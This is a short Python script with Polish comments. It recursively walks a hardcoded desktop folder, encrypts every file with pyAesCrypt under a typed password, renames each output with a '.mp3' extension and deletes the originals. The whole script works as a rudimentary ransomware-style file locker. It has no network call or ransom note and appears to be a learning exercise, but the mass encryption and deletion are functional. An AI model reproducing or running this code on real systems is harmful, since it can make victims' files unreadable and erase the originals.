import pyAesCrypt
import os

# funkcja szyfrowanie plików
def encryption(file, password):

    #rozmiar buforu
    buffer_size = 512 * 1024

    #wywołujemy metode szyfrowania
    pyAesCrypt.encryptFile(
        str(file),
        str(file) + ".mp3",
        password,
        buffer_size,
    )

    #wyświetlami komunikat o imieniu szyfrowanego pliku
    print("[Plik ' " + str(os.path.splitext(file)[0]) + "' zaszyfrowan]")

    #usuwamy początkowy plik
    os.remove(file)

# funkcyja skanowania katalogów
def walking_by_dirs(dir, password):
    #sprawdzamy wszystkie podkatalogi w zaznaczonym katalogu
    for name in os.listdir(dir):
        path = os.path.join(dir, name)

        #jeżeli znajdziemy plik - szyfrujemy
        if os.path.isfile(path):
            try:
                encryption(path, password)
            except Exception as ex:
                print(ex)
        #jeżeli nachodzimy katalog - powtarzamy cykl w poszukiwaniu plików
        else:
            walking_by_dirs(path,password)

password = input("Hasło: ")
walking_by_dirs("C:/Users/Hladkyi Dmytro/Desktop/PYTHON" , password)